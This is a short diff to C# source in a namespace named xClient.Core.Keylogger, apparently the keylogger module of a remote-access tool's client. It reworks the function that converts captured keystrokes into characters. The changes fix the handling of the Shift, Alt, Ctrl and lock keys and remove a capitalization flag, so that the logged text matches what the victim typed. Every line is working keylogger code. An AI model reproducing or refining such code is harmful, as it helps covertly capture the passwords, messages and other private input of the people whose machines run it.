@@ -174,7 +174,7 @@ namespace xClient.Core.Keylogger
                                 // The pressed key is not special, but we have encountered
                                 // a situation of multiple key presses, so just build them.
                                 _logFileBuffer.Append(HighlightSpecialKey(k.ModifierKeys.BuildString() +
-                                                      FromKeys(k, false)));
+                                                      FromKeys(k)));
                             }
                         }
                         // We don't have to worry about nearly all modifier keys...
@@ -312,20 +312,29 @@ namespace xClient.Core.Keylogger
             return Win32.GetKeyboardLayout(Win32.GetWindowThreadProcessId(Win32.GetForegroundWindow(), out pid));
         }
 
-        private char? FromKeys(LoggedKey key, bool AllowCapitalization = true)
+        private char? FromKeys(LoggedKey key)
         {
             //keyStates is a byte array that specifies the current state of the keyboard and keys
             //The keys we are interested in are modifier keys such as shift and caps lock
             byte[] keyStates = new byte[256];
 
-            keyStates[(int)KeyloggerKeys.VK_SHIFT] = (key.ModifierKeys.ShiftKeyPressed && AllowCapitalization) ? (byte)128 : (byte)0;
-            keyStates[(int)KeyloggerKeys.VK_CAPITAL] = (key.ModifierKeys.CapsLock && AllowCapitalization) ? (byte)128 : (byte)0;
+            if (key.ModifierKeys.ShiftKeyPressed)
+                keyStates[(int) KeyloggerKeys.VK_SHIFT] = 0x80;
 
-            keyStates[(int)KeyloggerKeys.VK_MENU] = key.ModifierKeys.CtrlKeyPressed ? (byte)128 : (byte)0;
-            keyStates[(int)KeyloggerKeys.VK_CONTROL] = key.ModifierKeys.AltKeyPressed ? (byte)128 : (byte)0;
+            if (key.ModifierKeys.AltKeyPressed)
+                keyStates[(int) KeyloggerKeys.VK_MENU] = 0x80;
 
-            keyStates[(int)KeyloggerKeys.VK_NUMLOCK] = key.ModifierKeys.NumLock ? (byte)128 : (byte)0;
-            keyStates[(int)KeyloggerKeys.VK_SCROLL] = key.ModifierKeys.ScrollLock ? (byte)128 : (byte)0;
+            if (key.ModifierKeys.CtrlKeyPressed)
+                keyStates[(int) KeyloggerKeys.VK_CONTROL] = 0x80;
+
+            if (key.ModifierKeys.CapsLock)
+                keyStates[(int) KeyloggerKeys.VK_CAPITAL] = 0x01;
+
+            if (key.ModifierKeys.ScrollLock)
+                keyStates[(int) KeyloggerKeys.VK_SCROLL] = 0x01;
+
+            if (key.ModifierKeys.NumLock)
+                keyStates[(int) KeyloggerKeys.VK_NUMLOCK] = 0x01;
 
             var sb = new StringBuilder(10);
 
